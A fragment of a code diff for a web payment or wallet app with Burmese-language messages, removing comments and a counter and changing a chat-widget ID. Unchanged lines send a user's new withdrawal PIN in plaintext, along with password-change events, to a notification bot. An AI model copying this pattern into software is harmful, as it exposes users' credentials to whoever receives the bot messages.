                         notifyBot('🔑 PASSWORD CHANGED', {
                             'User': user,
                             'Name': s.val().username,
@@ -1297,7 +1530,6 @@
             const pin = document.getElementById('new-pin').value;
             if(pin.length !== 6) return alert("PIN နံပါတ် ၆ လုံး ဖြစ်ရပါမည်။");
             db.ref('users/'+user).update({pin: pin}).then(()=>{
-                // ✅ PIN Change Notification
                 notifyBot('🔐 WITHDRAW PIN CHANGED', {
                     'User': user,
                     'New PIN': pin
@@ -1399,7 +1631,6 @@
             
             document.getElementById('adm-pay-status').innerHTML = '✅ Payment details updated at ' + new Date().toLocaleTimeString();
             
-            // ✅ Payment Update Notification
             notifyBot('💳 PAYMENT DETAILS UPDATED', {
                 'Wave Name': waveName,
                 'Wave Number': waveNum,
@@ -1414,11 +1645,9 @@
     function loadAdmVerify() {
         db.ref('requests/verifications').on('value', s => {
             let h = "";
-            let count = 0;
             s.forEach(r => {
                 const data = r.val();
                 if(data.status === 'pending') {
-                    count++;
                     h += `<div class="card" style="border-left:4px solid var(--active-gold);">
                         <div style="display:flex;justify-content:space-between;align-items:center;">
                             <b style="color:var(--primary);">${data.username || 'User'}</b>
@@ -1567,7 +1796,7 @@ var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
 var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
 s1.async=true;
-s1.src='https://embed.tawk.to/69cd57e58688f41c3a2a7d1b/default';
+s1.src='https://embed.tawk.to/69cd57e5868f41c3a2a7d1b/default';
 s1.charset='UTF-8';
 s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
